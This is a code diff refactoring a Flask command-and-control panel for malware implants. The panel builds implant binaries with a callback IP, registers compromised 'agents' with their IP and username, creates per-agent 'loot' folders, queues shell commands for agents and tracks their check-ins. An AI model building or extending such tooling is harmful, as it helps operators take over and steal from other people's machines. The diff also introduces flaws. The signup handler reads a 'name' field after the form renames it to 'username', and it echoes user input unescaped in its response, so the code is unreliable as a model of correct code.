@@ -31,30 +31,18 @@ def login_required(f):
     return wrap
 
 
-class MyForm(FlaskForm):
-    """Form used to configure the main implant
-
-    :param ip: The callback IP address
-    :type ip: str
-    :param sleep: The amount of the time the implant should wait to callback
-    :type sleep: str
-    :returns: none
-    :rtype: None
-    """
-
-    ip = StringField("IP")
+class ImplantConfig(FlaskForm):
+    callback_ip = StringField("Callback IP")
     sleep = StringField("Sleep Time")
 
 
-class AuthForm(FlaskForm):
-    """Form used to register a user"""
-
+class UserRegistration(FlaskForm):
     email = StringField("email")
-    name = StringField("name")
+    username = StringField("username")
     password = PasswordField("password")
 
 
-def build_implant(ip="127.0.0.1", sleepTime="0"):
+def build_implant(ip: str="127.0.0.1", sleepTime: str="0") -> None:
     """Builds the binary using the user provided config values
 
     :param ip: The callback IP address, defaulted at localhost
@@ -69,39 +57,38 @@ def build_implant(ip="127.0.0.1", sleepTime="0"):
     )
 
 
-def add_agent(agent_dict):
-    """Adds an agent to the backend database
+def add_agent(agent_info: dict) -> int:
+    """Adds an agent to the Flask app database
 
-    :param agent_dict: A dictionary containing all the agent information
-    :type agent_dict: dict
-    :returns: the ID of the new agent :rtype: int
+    :param agent_info: A dictionary containing all the agent information
+    :type agent_info: dict
+    :returns: the ID of the new agent 
+    :rtype: int
     """
     # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])
     # ).scalar():
-    args = [str(agent_dict["Stats"][key]) for key in agent_dict["Stats"]]
-    args += [str(agent_dict["total"])]
-    args += [agent_dict["IP"]]
-    args += [agent_dict["USERNAME"]]
-    args += [agent_dict["SleepTime"]]
-    agent = Agent(*args)
-    db.session.add(agent)
+    args = [str(agent_info["Stats"][key]) for key in agent_info["Stats"]]
+    args += [str(agent_info["total"])]
+    args += [agent_info["IP"]]
+    args += [agent_info["USERNAME"]]
+    args += [agent_info["SleepTime"]]
+    new_agent = Agent(*args)
+    db.session.add(new_agent)
     db.session.flush()
-    agent_id = agent.id
-    print(agent_id)
+    agent_id = new_agent.id
     db.session.commit()
-    print(agent_id)
     os.mkdir(f"loot/agent_{agent_id}")
-    return agent.id
+    return new_agent.id
 
 
-@app.route("/config", methods=["GET", "POST"])
+@app.route("/implant", methods=["GET", "POST"])
 @login_required
-def generate():
+def implant():
     """Endpoint that contains a form allowing the user to provide values
     for a custom config and generate a new implant binary
 
     """
-    form = MyForm()
+    form = ImplantConfig()
     if request.method == "POST":
         args = [
             request.form[key] for key in request.form.keys() if request.form[key] != ""
@@ -112,18 +99,17 @@ def generate():
     return render_template("config.html", form=form)
 
 
-@app.route("/bot<id>", methods=["GET"])
+@app.route("/agent<id>", methods=["GET"])
 @login_required
-def bot(id):
+def agent(id):
     """Endpoint that displays all the information regarding the
     bot with the specified ID, and includes an interactive shell.
 
     :param id: The ID of the agent
     :type id: str
     """
-    agent = Agent.query.filter_by(id=id).first()
-    print(agent)
-    return render_template("bot.html", agent=agent)
+    selected_agent = Agent.query.filter_by(id=id).first()
+    return render_template("agent.html", agent=selected_agent)
 
 
 @app.route("/", methods=["GET"])
@@ -140,7 +126,7 @@ def home():
 
 @app.route("/api/1.1/add_command", methods=["POST"])
 def add_command():
-    """API endpoint that allows the bot terminal to add
+    """API endpoint that allows the agent terminal to add
     commands to the Command table in the database
 
     :returns: a json RPC object containing any finished jobs and the new job ID
@@ -180,6 +166,21 @@ def welcome():
     return render_template("welcome.html")
 
 
+class UserLogin:
+    def __init__(self, username, password):
+        self.username = username
+        self.password = password
+
+    def attempt_login(self):
+        actual_user = User.query.filter(User.username == self.username).first()
+        if not actual_user:
+            return False
+        elif not check_password_hash(actual_user.password, self.password):
+            return False
+        return True
+
+
+
 @app.route("/login", methods=["GET", "POST"])
 def login():
     """Endpoint that allows a user to login and authenticate
@@ -190,15 +191,13 @@ def login():
     if request.method == "POST":
         username = request.form["username"]
         password = request.form["password"]
-        user = User.query.filter(username == username).first()
-        if not user:
-            error = "Account not found"
-        elif not check_password_hash(user.password, password):
-            error = "Invalid credentials. Please try again."
-        else:
+        user = UserLogin(username, password)
+        if user.attempt_login():
             session["logged_in"] = True
             flash("You were just logged in!")
             return redirect(url_for("home"))
+        else:
+            error = "Invalid username or password"
     return render_template("login.html", error=error)
 
 
@@ -214,21 +213,21 @@ def logout():
 @app.route("/signup", methods=["GET", "POST"])
 def signup():
     """Endpoint that allows a user to register an account"""
-    form = AuthForm()
+    form = UserRegistration()
 
     if request.method == "POST":
         email = request.form["email"]
-        name = request.form["name"]
+        username = request.form["name"]
         password = request.form["password"]
 
-        user = User.query.filter_by(email=email).first()
+        already_user = User.query.filter_by(email=email).first()
 
-        if user:
-            return "BINGUS: ALREADY REGISTERED"
+        if already_user:
+            return f"{username} is already registered."
 
         new_user = User(
             email=email,
-            name=name,
+            name=username,
             password=generate_password_hash(password, method="sha256"),
         )
 
@@ -250,8 +249,8 @@ def check_agent_alive():
         last_seen = datetime.strptime(last_seen, "%d %B, %Y %H:%M:%S")
         curr_time = datetime.now()
         elapsed = curr_time - last_seen
-        agent_expected = timedelta(seconds=(agent.sleepTime * 2))
-        if elapsed > agent_expected:
+        expected_check_in_time = timedelta(seconds=(agent.sleepTime * 2))
+        if elapsed > expected_check_in_time:
             agent.isAlive = False
         else:
             agent.isAlive = True
